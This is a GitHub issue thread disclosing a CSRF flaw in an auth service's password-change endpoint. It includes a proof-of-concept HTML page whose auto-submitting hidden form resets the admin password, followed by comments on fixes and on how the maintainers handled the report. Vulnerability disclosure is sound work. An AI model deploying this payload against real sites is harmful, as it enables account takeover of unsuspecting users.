### **[omriman067](/omriman067)** commented [Feb 9, 2023](#issue-1577584753)

| Hi, I've found a vulnerability in the `/api/set-password` endpoint. There is no CSRF token when accessing this endpoint to change your password nor do you need to insert the current password. This leads to a CSRF vulnerability where an attacker can send a malicious link to a logged-on victim and when the victim accesses the attacker's site he will change his own password to an attacker controlled password thus leading to Account Takeover.  Here is the POC code for the exploit:  ``` <html>   <body>   <body onload="document.createElement('form').submit.call(document.getElementById('myForm'))">     <form id="myForm" name="myForm" action="http://omri:8000/api/set-password" method="POST">       <input type="hidden" name="userOwner" value="built&#45;in" />       <input type="hidden" name="userName" value="admin" />       <input type="hidden" name="newPassword" value="Hacked!@#" />       	  <input type=hidden name="submit" id="submit" value="Continue"/>     </form>   </body> </html>  ```  Here is a short exploitation demonstration: [casdoor-csrf](https://user-images.githubusercontent.com/11334916/217780623-321209a7-f08a-4f96-b6b3-6ae1fde88fb1.gif)  I would recommend adding a CSRF token or at least requiring the current password to successfully change the password. |

| But the code is sent to the mail or phone isn't it? For example, out of the box the admin user does not have a valid email or phone. A captcha will also probably work but again, verifying the current password would probably be best practice |

Not only that, the issue is classified under the questions label instead of being labelled as a bug. Your project is very well positioned in terms of competitive advantages (features & performance) but you've been digging it's grave since it's inception.  Is there anyone among the contributors who cares about this projects and the users unknowingly running this vulnerable auth service or not? |
